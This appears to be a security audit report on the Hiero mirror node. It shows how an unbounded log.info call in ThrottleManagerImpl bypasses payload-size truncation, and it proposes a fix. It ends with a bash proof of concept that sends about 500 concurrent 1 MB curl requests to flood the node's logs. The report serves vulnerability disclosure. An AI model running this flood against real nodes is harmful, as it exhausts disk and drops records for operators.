### Title
Unbounded Log Payload via `log.info("{}", request)` in `ThrottleManagerImpl.action()` Bypasses `maxPayloadLogSize` Truncation

### Summary
When a `LOG`-action throttle filter matches a `ContractCallRequest`, `ThrottleManagerImpl.action()` calls `log.info("{}", request)` which serializes the full Lombok-generated `toString()` of the request object — including the `data` field — with no size cap. The `maxPayloadLogSize` guard exists only in `LoggingFilter.getContent()` for HTTP-body logging and is entirely bypassed by this separate log call. An unprivileged attacker can craft requests whose `data` field (up to 1,048,576 characters per the `@Hex` default) matches the configured `CONTAINS` filter expression, causing each matched request to emit up to ~1 MB per log line.

### Finding Description

**Exact code path:**

`ContractController.call()` → `throttleManager.throttle(request)` → `ThrottleManagerImpl.throttle()` (lines 44–48) → `action(requestFilter, request)` → line 68:
```java
case LOG -> log.info("{}", request);
``` [1](#0-0) 

`log.info("{}", request)` invokes Lombok `@Data`-generated `toString()` on `ContractCallRequest`, which includes the raw `data` field string verbatim.

**Root cause — failed assumption:**

The `@Hex` annotation on `ContractCallRequest.data` permits up to `maxLength = 1048576L` characters (1 MB) by default: [2](#0-1) 

The `maxPayloadLogSize` truncation (default 300 chars) is implemented only inside `LoggingFilter.getContent()`: [3](#0-2) 

That guard operates on the raw HTTP request body cached by `ContentCachingRequestWrapper`. It has no effect on the independent `log.info("{}", request)` call inside `ThrottleManagerImpl`, which is a completely separate log statement operating on the already-deserialized Java object.

**Why the rate-limit check is insufficient:**

The global `rateLimitBucket` (default 500 RPS) is checked before the filter loop: [4](#0-3) 

500 requests/second × 1 MB per log line = **500 MB/s** of log output, which is sufficient to exhaust disk or log-buffer capacity rapidly.

**Filter configuration (default):**

The documented defaults are `action = LOG`, `field = DATA`, `type = CONTAINS`: [5](#0-4) 

`RequestProperties.test()` defaults to `rate = 100` (100%) and `limit = Long.MAX_VALUE`, meaning every matching request triggers the log action: [6](#0-5) 

**Exploit flow:**

1. Operator has a `LOG` filter configured with `DATA CONTAINS <expression>` (the documented default).
2. Attacker sends `POST /api/v1/contracts/call` with `data` = `"0x" + <expression> + "aa" * 524287` (~1 MB valid hex, passes `@Hex` validation).
3. Spring `@Valid` passes (data is valid hex within 1 MB limit).
4. `throttle()` passes the rate-limit bucket, enters the filter loop, filter matches, calls `action()`.
5. `log.info("{}", request)` emits a ~1 MB log line.
6. Repeated at up to 500 RPS → ~500 MB/s of log writes.

### Impact Explanation

Continuous disk fill can exhaust the log partition, causing the mirror node process to fail to write subsequent records, corrupting or dropping transaction/contract result logs. This directly maps to the stated scope: "Incorrect or missing records exported to mirror nodes." Log-buffer saturation can also cause async log appenders to drop records silently. Severity is **Medium-High**: availability impact on the logging subsystem with potential for record loss.

### Likelihood Explanation

The attack requires no authentication. The only precondition is that a `LOG`-action filter is active (the documented default action is `LOG`). The attacker needs to know or brute-force the filter `expression`, but common expressions like function selectors (4-byte hex) are easily guessable or observable. The attack is trivially repeatable and scriptable.

### Recommendation

Truncate the `data` field (and the full request `toString()`) before logging in `action()`. Replace:
```java
case LOG -> log.info("{}", request);
```
with a size-bounded variant, for example:
```java
case LOG -> {
    String repr = request.toString();
    log.info("{}", repr.length() > web3Properties.getMaxPayloadLogSize()
        ? repr.substring(0, web3Properties.getMaxPayloadLogSize()) + "…"
        : repr);
}
```
Alternatively, override `toString()` in `ContractCallRequest` to truncate `data` to `maxPayloadLogSize` characters, consistent with how `LoggingFilter` handles the HTTP body.

### Proof of Concept

```bash
# Assume filter: DATA CONTAINS "dead", action: LOG (documented default)
EXPR="dead"
# Build ~1 MB data field: 0x + "dead" + "aa"*524284
DATA="0x${EXPR}$(python3 -c "print('aa'*524284)")"

curl -s -X POST http://<mirror-node>:8545/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d "{\"to\":\"0x00000000000000000000000000000000000004e2\",\"gas\":21000,\"data\":\"${DATA}\"}"

# Repeat at rate up to 500 RPS:
for i in $(seq 1 500); do
  curl -s -X POST http://<mirror-node>:8545/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d "{\"to\":\"0x00000000000000000000000000000000000004e2\",\"gas\":21000,\"data\":\"${DATA}\"}" &
done
wait
# Each matched request writes ~1 MB to the log; 500 concurrent = ~500 MB/s log output.
```

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L38-42)
```java
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L66-69)
```java
    private void action(RequestProperties filter, ContractCallRequest request) {
        switch (filter.getAction()) {
            case LOG -> log.info("{}", request);
            case REJECT -> throw new ThrottleException("Invalid request");
```

**File:** web3/src/main/java/org/hiero/mirror/web3/validation/Hex.java (L27-27)
```java
    long maxLength() default 1048576L;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/LoggingFilter.java (L104-108)
```java
        // Truncate log message size unless it's a 5xx error
        if (content.length() > maxPayloadLogSize && status < HttpStatus.INTERNAL_SERVER_ERROR.value()) {
            content = reorderFields(content);
            content = StringUtils.substring(content, 0, maxPayloadLogSize);
        }
```

**File:** docs/configuration.md (L721-724)
```markdown
| `hiero.mirror.web3.throttle.request[].action`                | LOG                                                | The action to take if the request filter matches. One of `LOG`, `REJECT`, or `THROTTLE`.                                                                                                         |
| `hiero.mirror.web3.throttle.request[].filters[].expression`  |                                                    | The expression or field value to filter the request field                                                                                                                                        |
| `hiero.mirror.web3.throttle.request[].filters[].field`       | DATA                                               | The field to target for filtering requests                                                                                                                                                       |
| `hiero.mirror.web3.throttle.request[].filters[].type`        | CONTAINS                                           | How the field should be matched against the request field                                                                                                                                        |
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/RequestProperties.java (L35-39)
```java
    private long limit = Long.MAX_VALUE;

    @Min(0)
    @Max(100)
    private long rate = 100;
```
